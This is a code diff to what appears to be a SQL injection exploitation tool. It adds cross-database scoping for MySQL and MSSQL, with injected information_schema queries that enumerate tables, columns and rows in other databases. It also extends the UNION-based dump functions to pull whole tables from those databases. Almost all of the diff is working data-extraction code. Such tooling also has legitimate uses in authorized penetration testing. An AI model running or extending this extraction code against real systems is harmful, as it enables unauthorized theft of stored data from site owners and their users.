@@ -516,6 +516,79 @@ def dump(oracle, prof, table, cols, limit=20):
         yield [extract_str(oracle, prof, prof["cell_at"].format(c=c, t=table, k=k)) for c in cols]
 
 
+# ===================== multi-database scoping ===========================
+# The catalog walk above is scoped to the *current* database. To dump another
+# database we re-scope the catalog/data queries to it — but only where one
+# injection point can actually reach across databases.
+
+# Databases/schemas that hold the engine's own machinery, not application data —
+# skipped by a "dump every database" sweep.
+SYSTEM_DBS = {
+    "mysql":    {"information_schema", "performance_schema", "mysql", "sys"},
+    "postgres": {"information_schema", "pg_catalog", "pg_toast"},
+    "mssql":    {"master", "tempdb", "model", "msdb"},
+    "sqlite":   set(),
+}
+
+
+def cross_db_supported(dbms):
+    """Whether a single injection point can read *other* databases' data. MySQL and
+    MSSQL qualify across databases in one query (`db.table`); SQLite (one file) and
+    Postgres (one database per connection) can't — only the current one is reachable."""
+    return dbms in ("mysql", "mssql")
+
+
+def scoped_profile(prof, dbms, db):
+    """A copy of `prof` with the catalog/data queries re-scoped to database `db`,
+    mirroring the per-DBMS templates above. Returns `prof` unchanged when `db` is the
+    current database (None) or the engine can't cross databases."""
+    if not db or not cross_db_supported(dbms):
+        return prof
+    p = dict(prof)
+    if dbms == "mysql":
+        w = "table_schema='" + db + "'"
+        p["tables_n"] = "(SELECT count(*) FROM information_schema.tables WHERE " + w + ")"
+        p["table_at"] = "(SELECT table_name FROM information_schema.tables WHERE " + w + " LIMIT 1 OFFSET {k})"
+        p["cols_n"]   = "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}' AND " + w + ")"
+        p["col_at"]   = "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' AND " + w + " LIMIT 1 OFFSET {k})"
+        p["rows_n"]   = "(SELECT count(*) FROM `" + db + "`.{t})"
+        p["cell_at"]  = "(SELECT {c} FROM `" + db + "`.{t} LIMIT 1 OFFSET {k})"
+    elif dbms == "mssql":
+        cat = db + ".information_schema."
+        p["tables_n"] = "(SELECT count(*) FROM " + cat + "tables)"
+        p["table_at"] = "(SELECT table_name FROM " + cat + "tables ORDER BY table_name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)"
+        p["cols_n"]   = "(SELECT count(*) FROM " + cat + "columns WHERE table_name='{t}')"
+        p["col_at"]   = "(SELECT column_name FROM " + cat + "columns WHERE table_name='{t}' ORDER BY column_name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)"
+        p["rows_n"]   = "(SELECT count(*) FROM " + db + ".dbo.{t})"
+        p["cell_at"]  = "(SELECT {c} FROM " + db + ".dbo.{t} ORDER BY 1 OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)"
+    return p
+
+
+def _qualify(dbms, db, table):
+    """A table reference qualified to another database, for cross-database dumps."""
+    if not db or not cross_db_supported(dbms):
+        return table
+    if dbms == "mysql":
+        return "`" + db + "`." + table
+    if dbms == "mssql":
+        return db + ".dbo." + table
+    return table
+
+
+def _uscope(dbms, which, db):
+    """The union catalog source ('col FROM rest') re-scoped to database `db`."""
+    if not db or which == "dbs" or not cross_db_supported(dbms):
+        return _UFROM[dbms][which]
+    if dbms == "mysql":
+        if which == "tables":
+            return "table_name FROM information_schema.tables WHERE table_schema='" + db + "'"
+        return "column_name FROM information_schema.columns WHERE table_name={t} AND table_schema='" + db + "'"
+    # mssql
+    if which == "tables":
+        return "table_name FROM " + db + ".information_schema.tables"
+    return "column_name FROM " + db + ".information_schema.columns WHERE table_name={t}"
+
+
 # ============================ union-based ===============================
 # When the injection point reflects query output, UNION SELECT reads whole
 # values (and whole tables, via group_concat) in *one* request instead of
@@ -640,10 +713,10 @@ def union_value(http, oracle, dbms, ncols, refcol, expr):
     return m.group(1) if m else ""
 
 
-def _union_list(http, oracle, dbms, ncols, refcol, which, **fmt):
+def _union_list(http, oracle, dbms, ncols, refcol, which, db=None, **fmt):
     if "t" in fmt:                       # table name goes in as a quote-free literal
         fmt["t"] = _strlit(dbms, fmt["t"])
-    frag = _dequote(dbms, _UFROM[dbms][which].format(**fmt))   # also the static predicates
+    frag = _dequote(dbms, _uscope(dbms, which, db).format(**fmt))   # also the static predicates
     col, _, frm = frag.partition(" FROM ")
     data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, col)} FROM {frm}")
     return [x for x in data.split(_UROWSEP) if x]
@@ -653,15 +726,15 @@ def union_databases(http, oracle, dbms, ncols, refcol):
     return _union_list(http, oracle, dbms, ncols, refcol, "dbs")
 
 
-def union_tables(http, oracle, dbms, ncols, refcol):
-    return _union_list(http, oracle, dbms, ncols, refcol, "tables")
+def union_tables(http, oracle, dbms, ncols, refcol, db=None):
+    return _union_list(http, oracle, dbms, ncols, refcol, "tables", db=db)
 
 
-def union_columns(http, oracle, dbms, ncols, refcol, table):
-    return _union_list(http, oracle, dbms, ncols, refcol, "cols", t=table)
+def union_columns(http, oracle, dbms, ncols, refcol, table, db=None):
+    return _union_list(http, oracle, dbms, ncols, refcol, "cols", db=db, t=table)
 
 
-def union_dump(http, oracle, dbms, ncols, refcol, table, cols):
+def union_dump(http, oracle, dbms, ncols, refcol, table, cols, db=None):
     colsep = _strlit(dbms, _UCOLSEP)
     parts = []
     for i, c in enumerate(cols):
@@ -669,5 +742,6 @@ def union_dump(http, oracle, dbms, ncols, refcol, table, cols):
             parts.append(colsep)
         parts.append(f"cast({c} as varchar(4000))" if dbms in ("mssql", "postgres") else c)
     row = _ucat(dbms, parts)
-    data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, row)} FROM {table}")
+    src = _qualify(dbms, db, table)
+    data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, row)} FROM {src}")
     return [r.split(_UCOLSEP) for r in data.split(_UROWSEP) if r]
